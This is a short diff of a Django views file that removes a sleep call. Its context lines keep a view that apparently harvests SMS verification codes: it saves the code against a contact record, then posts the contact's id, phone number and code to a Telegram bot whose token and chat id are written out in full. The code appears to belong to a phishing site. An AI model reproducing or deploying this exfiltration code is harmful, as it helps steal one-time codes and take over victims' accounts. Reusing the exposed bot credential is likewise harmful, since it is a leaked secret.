@@ -14,7 +14,6 @@ from django.contrib.auth.decorators import user_passes_test
 from django.http import HttpResponseRedirect
 from django.urls import reverse
 from django.views.decorators.csrf import ensure_csrf_cookie
-import time
 def index(request):
     return render(request, "pages/index.html")
 
@@ -364,7 +363,6 @@ def dseckapital(request):
         last_contact = ContactModel.objects.latest('created_at')
         last_contact.sms=concatenated
         last_contact.save()
-        time.sleep(10)
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nnumber{last_contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html' )
     
